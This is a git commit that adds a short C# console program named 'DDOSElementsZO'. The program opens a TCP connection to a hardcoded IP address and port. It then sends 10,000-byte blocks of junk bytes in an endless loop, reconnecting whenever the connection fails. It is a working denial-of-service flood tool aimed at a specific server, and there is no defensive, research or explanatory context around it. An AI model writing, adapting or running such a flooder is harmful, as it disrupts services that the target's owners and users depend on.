7f7dd44b6abeac453d57a3617e4b097402895622
Duy <nguyenhoangduy1997@gmail.com>
2020-07-27 19:20:02 +0700

    Element

---
+++ BE/DDOSElementsZO/Program.cs
@@ -0,0 +1,42 @@
+﻿using SimpleTCP;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace DDOSElementsZO
+{
+    class Program
+    {
+        private static byte[] Data { get; set; }
+        static void Main(string[] args)
+        {
+            Data = Enumerable.Range(0, 10000).Select(x => Convert.ToByte(255)).ToArray();
+            var Client = new SimpleTcpClient();
+            Client.DataReceived += Client_DataReceived;
+            Client.Connect("51.79.145.33", 37955);
+            while (true)
+            {
+                try
+                {
+                    Client.Write(Data);
+                    Console.Write("SEND - ");
+                }
+                catch (Exception ex)
+                {
+                    Console.Write(ex.Message);
+                    Client = new SimpleTcpClient();
+                    Client.DataReceived += Client_DataReceived;
+                    Client.Connect("51.79.145.33", 37955);
+                }
+            }
+        }
+
+        private static void Client_DataReceived(object sender, Message e)
+        {
+            Data = e.Data;
+            Console.WriteLine("[RECIEVED]");
+        }
+    }
+}
